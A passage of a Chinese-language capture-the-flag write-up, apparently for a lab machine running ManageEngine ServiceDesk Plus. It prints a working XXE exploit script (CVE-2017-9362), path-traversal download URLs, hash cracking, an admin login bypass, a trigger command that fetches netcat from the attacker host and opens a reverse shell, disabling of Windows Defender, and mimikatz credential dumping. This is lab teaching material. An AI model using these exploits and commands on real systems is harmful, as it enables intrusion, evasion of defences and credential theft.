+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%889.12.32.png" alt="截屏2021-12-21 下午9.12.32"><br>选择工作表右键，点击取消隐藏发现<code>Password Data</code>工作表<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%889.28.46.png" alt="截屏2021-12-21 下午9.28.46"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%889.28.56.png" alt="截屏2021-12-21 下午9.28.56"><br>其中包含一些密码和一个文件路径<code>C:\temp\Password Audit\it_logins.txt</code>，在路径对应的文件中可能包含一些登录信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%889.29.19.png" alt="截屏2021-12-21 下午9.29.19"></p>
+<h2 id="0x02-ME-SDP-漏洞"><a href="#0x02-ME-SDP-漏洞" class="headerlink" title="0x02 ME SDP 漏洞"></a>0x02 ME SDP 漏洞</h2><p>这个版本的 ManageEngine ServiceDesk Plus 存在许多漏洞，我们可以通过这些漏洞来获取信息</p>
+<h3 id="XXE漏洞（CVE-2017-9362）"><a href="#XXE漏洞（CVE-2017-9362）" class="headerlink" title="XXE漏洞（CVE-2017-9362）"></a>XXE漏洞（CVE-2017-9362）</h3><p>在 CMDB API 中的 INPUT_DATA 字段中添加 CI 时会造成 XML 外部实体注入攻击，攻击者在发送数据时将任何系统文件包含到 payload 当中，根据该漏洞编写了一个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">xxe = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE foo [&lt;!ENTITY xxe15d41 SYSTEM &quot;file:///&#123;filepath&#125;&quot;&gt; ]&gt;&lt;API version=&#x27;1.0&#x27; locale=&#x27;en&#x27;&gt;</span></span><br><span class="line"><span class="string">    &lt;records&gt;</span></span><br><span class="line"><span class="string">        &lt;record&gt;</span></span><br><span class="line"><span class="string">            &lt;parameter&gt;</span></span><br><span class="line"><span class="string">                &lt;name&gt;CI Name&lt;/name&gt;</span></span><br><span class="line"><span class="string">                &lt;value&gt;Tomcat Server 3 0xdfstart&amp;xxe15d41;0xdfstop&lt;/value&gt;</span></span><br><span class="line"><span class="string">            &lt;/parameter&gt;</span></span><br><span class="line"><span class="string">        &lt;/record&gt;</span></span><br><span class="line"><span class="string">    &lt;/records&gt;</span></span><br><span class="line"><span class="string">&lt;/API&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file</span>(<span class="params">ip_address, filepath</span>):</span></span><br><span class="line">    login_url = <span class="string">&quot;http://&quot;</span>+ip_address+<span class="string">&quot;:8080/j_security_check&quot;</span></span><br><span class="line">    api_url = <span class="string">&quot;http://&quot;</span>+ip_address+<span class="string">&quot;:8080/api/cmdb/ci&quot;</span></span><br><span class="line">    login_data=&#123;<span class="string">&quot;j_username&quot;</span>: <span class="string">&quot;guest&quot;</span>, <span class="string">&quot;j_password&quot;</span>: <span class="string">&quot;guest&quot;</span>, <span class="string">&quot;LDAPEnable&quot;</span>: <span class="string">&quot;false&quot;</span>, <span class="string">&quot;hidden&quot;</span>: <span class="string">&quot;Select a Domain&quot;</span>, <span class="string">&quot;hidden&quot;</span>: <span class="string">&quot;For Domain&quot;</span>, <span class="string">&quot;AdEnable&quot;</span>: <span class="string">&quot;false&quot;</span>, <span class="string">&quot;DomainCount&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;LocalAuth&quot;</span>: <span class="string">&quot;No&quot;</span>, <span class="string">&quot;LocalAuthWithDomain&quot;</span>: <span class="string">&quot;No&quot;</span>, <span class="string">&quot;dynamicUserAddition_status&quot;</span>: <span class="string">&quot;true&quot;</span>, <span class="string">&quot;localAuthEnable&quot;</span>: <span class="string">&quot;true&quot;</span>, <span class="string">&quot;logonDomainName&quot;</span>: <span class="string">&quot;-1&quot;</span>, <span class="string">&quot;loginButton&quot;</span>: <span class="string">&quot;Login&quot;</span>, <span class="string">&quot;checkbox&quot;</span>: <span class="string">&quot;checkbox&quot;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> s:</span><br><span class="line">        s.post(login_url, data=login_data)</span><br><span class="line">        xxe_data=&#123;<span class="string">&quot;OPERATION_NAME&quot;</span>: <span class="string">&quot;add&quot;</span>, <span class="string">&quot;INPUT_DATA&quot;</span>: xxe.<span class="built_in">format</span>(filepath=filepath)&#125;</span><br><span class="line">        response = s.post(api_url, data=xxe_data)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(response.text[response.text.index(<span class="string">&quot;0xdfstart&quot;</span>) + <span class="built_in">len</span>(<span class="string">&quot;0xdfstart&quot;</span>):response.text.index(<span class="string">&quot;0xdfstop&quot;</span>)].replace(<span class="string">&quot;\\r\\n&quot;</span>,<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error: No data returned&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Usage: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> [ip] [filepath]\nfilepath can be file on target, or smb or http uri&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line">get_file(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>].replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>))</span><br></pre></td></tr></table></figure>
+<p>执行该脚本来抓取 win.ini</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 xxe.py 10.10.10.132 <span class="string">&quot;C:\windows\win.ini&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8B%E5%8D%884.33.20.png" alt="截屏2021-12-22 下午4.33.20"><br>发现可以直接读取到 win.ini，那么也就能读取到上面的密码文件中的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 xxe.py 10.10.10.132 <span class="string">&quot;C:\temp\Password Audit\it_logins.txt&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8B%E5%8D%885.03.17.png" alt="截屏2021-12-22 下午5.03.17"><br>成功拿到密码 alice/$sys4ops@megabank!</p>
+<h3 id="LFI-任意文件下载（CVE-2017-11511）"><a href="#LFI-任意文件下载（CVE-2017-11511）" class="headerlink" title="LFI/任意文件下载（CVE-2017-11511）"></a>LFI/任意文件下载（CVE-2017-11511）</h3><p>这次是通过本地文件包含漏洞来访问系统文件,但是目标文件作为与 SDP 安装关联的四个目录之一的相对路径需要给出,包括有意打开所有 SDP 安装的选项4，它允许请求所有与该路径相关的任何文件。与请求C盘的 win.ini 不同，SDP 安装在E盘。开始尝试获取数据库备份文件，首先请求日志路径为<code>E:\ManageEngine\ServiceDesk\bin\SDPbackup.log</code>，而访问路径如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.132:8080/fosagent/repl/download-file?basedir=4&amp;filepath=\..\..\..\..\..\..\manageengine\servicedesk\bin\sdpbackup.log</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-25%20%E4%B8%8B%E5%8D%885.53.40.png" alt="截屏2021-12-25 下午5.53.40"><br>在其中记录了组成数据库备份的两个文件的位置，具体文件名如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">backup_postgres_9309_fullbackup_04_12_2019_17_43_part_1.data</span></span><br><span class="line"><span class="string">backup_postgres_9309_fullbackup_04_12_2019_17_43_part_2.data</span></span><br></pre></td></tr></table></figure>
+<p>使用 wget 把它们下载下来进行查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">&quot;http://10.10.10.132:8080/fosagent/repl/download-file?basedir=4&amp;filepath=\..\..\..\..\..\..\manageengine\servicedesk\backup\backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data&quot;</span></span><br><span class="line">wget <span class="string">&quot;http://10.10.10.132:8080/fosagent/repl/download-file?basedir=4&amp;filepath=\..\..\..\..\..\..\manageengine\servicedesk\backup\backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-25%20%E4%B8%8B%E5%8D%886.18.07.png" alt="截屏2021-12-25 下午6.18.07"><br>解压下载文件，里面存在许多 sql 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unzip backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data</span><br><span class="line">unzip backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-25%20%E4%B8%8B%E5%8D%886.27.24.png" alt="截屏2021-12-25 下午6.27.24"><br>查看 aaapassword.sql 和 aaalogin.sql，其中包含各种账户的哈希值。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-25%20%E4%B8%8B%E5%8D%886.30.53.png" alt="截屏2021-12-25 下午6.30.53"><br><strong>哈希破解</strong><br>经过整理后哈希值如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG</span></span><br><span class="line"><span class="string">$2a$12$2WVZ7E/MbRgTqdkWCOrJP.qWCHcsa37pnlK.0OyHKfd4lyDweMtki</span></span><br><span class="line"><span class="string">$2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm</span></span><br><span class="line"><span class="string">$2a$12$hmG6bvLokc9jNMYqoCpw2Op5ji7CWeBssq1xeCmU.ln/yh0OBPuDa</span></span><br><span class="line"><span class="string">$2a$12$6sw6V2qSWANP.QxLarjHKOn3tntRUthhCrwt7NWleMIcIN24Clyyu</span></span><br><span class="line"><span class="string">$2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa</span></span><br><span class="line"><span class="string">$2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu</span></span><br><span class="line"><span class="string">$2a$12$4.iNcgnAd8Kyy7q/mgkTFuI14KDBEpMhY/RyzCE4TEMsvd.B9jHuy</span></span><br></pre></td></tr></table></figure>
+<p>这些哈希是<code>bcrypt</code>，使用 hashcat 进行破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-25%20%E4%B8%8B%E5%8D%887.19.05.png" alt="截屏2021-12-25 下午7.19.05"></p>
+<p>最终得到以下三个密码，其他密码无法破解</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">zachary_33258/0987654321</span></span><br><span class="line"><span class="string">fiona/1q2w3e4r</span></span><br><span class="line"><span class="string">mary/1234567890</span></span><br></pre></td></tr></table></figure>
+<h3 id="身份验证绕过"><a href="#身份验证绕过" class="headerlink" title="身份验证绕过"></a>身份验证绕过</h3><p>由于之前我们已经通过 guest 账户登录，那么可以通过 /mc 目录来绕过 administrator 的登录验证，访问 /mc 目录并注销<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-25%20%E4%B8%8B%E5%8D%887.44.27.png" alt="截屏2021-12-25 下午7.44.27"><br>输入账号密码均为 administrator（其实密码任意输入也没关系，但用户名一定要是administrator）<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-25%20%E4%B8%8B%E5%8D%887.44.57.png" alt="截屏2021-12-25 下午7.44.57"><br>成功登录目标系统<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-25%20%E4%B8%8B%E5%8D%887.46.58.png" alt="截屏2021-12-25 下午7.46.58"></p>
+<h2 id="0x03-上线-system"><a href="#0x03-上线-system" class="headerlink" title="0x03 上线[system]"></a>0x03 上线[system]</h2><p>在 0xdf 大神的博客中讲述多条线路进行突破，分别是在 kali 下运用 administrator 账户获取 system 权限以及在 Windows 下使用之前获取的 Alice 用户通过 WinRM 进行权限提升，相比 Windows 的操作，我更喜欢使用 kali 来完成</p>
+<h3 id="rce完成上线"><a href="#rce完成上线" class="headerlink" title="rce完成上线"></a>rce完成上线</h3><p>先前通过权限绕过获取到 administrator 用户，在 Admin 上存在 Custom Triggers 可以帮助我们完成远程命令执行<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%882.36.23.png" alt="截屏2021-12-26 上午2.36.23"><br>点击 Add New Action 来设置新的触发器<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%882.37.32.png" alt="截屏2021-12-26 上午2.37.32"><br>在 Action 中设置触发器脚本，将触发优先级设置为高并设置脚本命令帮助我们获取反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c powershell iwr -uri 10.10.14.4/nc64.exe -outfile c:\windows\system32\spool\drivers\color\nc.exe; c:\windows\system32\spool\drivers\color\nc.exe -e cmd.exe 10.10.14.4 443</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%883.14.32.png" alt="截屏2021-12-26 上午3.14.32"><br>保存完成后在本地监听 443 端口，并开启 http 服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m Simple HTTPServer 80</span><br></pre></td></tr></table></figure>
+<p>在请求页面新建一个请求，将优先级设置为高<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%883.37.38.png" alt="截屏2021-12-26 上午3.37.38">运行后返回 system 权限的命令行<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%883.41.07.png" alt="截屏2021-12-26 上午3.41.07"></p>
+<h3 id="msf进程注入读取flag"><a href="#msf进程注入读取flag" class="headerlink" title="msf进程注入读取flag"></a>msf进程注入读取flag</h3><p>这里我们无法读取两个flag，虽然现在是系统权限，但是它们都经过 EFS 加密，因此我们需要账户的明文密码来进行解密</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\Users\Administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%884.02.23.png" alt="截屏2021-12-26 上午4.02.23"><br>上传 mimikatz 进行密码破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> c:\windows\system32\spool\drivers\color\</span><br><span class="line">powershell iwr -uri 10.10.14.4/mimikatz.exe -outfile m.exe</span><br><span class="line">.\m.exe</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%884.15.23.png" alt="截屏2021-12-26 上午4.15.23"><br>无法执行，这是因为被 Windows Defender 隔离了，我们需要禁用它并再次运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell Set-MpPreference -DisableRealtimeMonitoring <span class="variable">$true</span></span><br><span class="line">powershell iwr -uri 10.10.14.4/mimikatz.exe -outfile m.exe</span><br><span class="line">.\m.exe</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%884.18.19.png" alt="截屏2021-12-26 上午4.18.19"><br>开始运行它来获取密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%884.20.44.png" alt="截屏2021-12-26 上午4.20.44"><br>显示报错，这个问题已经在 GitHub 中进行了反馈，解决方法是我们需要一个老版本的猕猴桃来完成上传</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell iwr -uri 10.10.14.4/mimikatz2.exe -outfile m2.exe</span><br><span class="line">.\m.exe</span><br></pre></td></tr></table></figure>
+<p>运行 mimikatz 来获取密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%885.37.20.png" alt="截屏2021-12-26 上午5.37.20"><br>通过整理后发现以下用户</p>
